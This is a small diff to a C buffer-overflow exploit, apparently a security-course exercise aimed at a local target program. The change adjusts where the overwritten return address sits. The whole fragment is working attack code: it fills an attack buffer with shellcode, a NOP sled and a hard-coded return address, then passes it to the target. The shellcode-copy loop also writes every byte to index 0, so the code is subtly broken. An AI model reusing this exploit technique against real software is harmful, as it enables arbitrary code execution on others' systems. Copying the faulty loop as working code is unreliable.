@@ -7,7 +7,7 @@
 #define TARGET "../targets/target1"
 
 #define SHELL_SIZE 46
-
+#define BUF_TO_RET 120
 #define BUF_SIZE 125
 #define BUF_ADDR 0x2021feb0
 
@@ -22,10 +22,9 @@ main ( int argc, char * argv[] )
 		attack_buffer[0] = shellcode[i];
 	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
 		attack_buffer[i] = 0x90;
-	attack_buffer[BUF_SIZE - 1] = BUF_ADDR;
 
 
-	int *ret_address = (int*)&attack_buffer[BUF_SIZE - 1];
+	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
 	*ret_address = BUF_ADDR;
 
 	args[0] = TARGET;
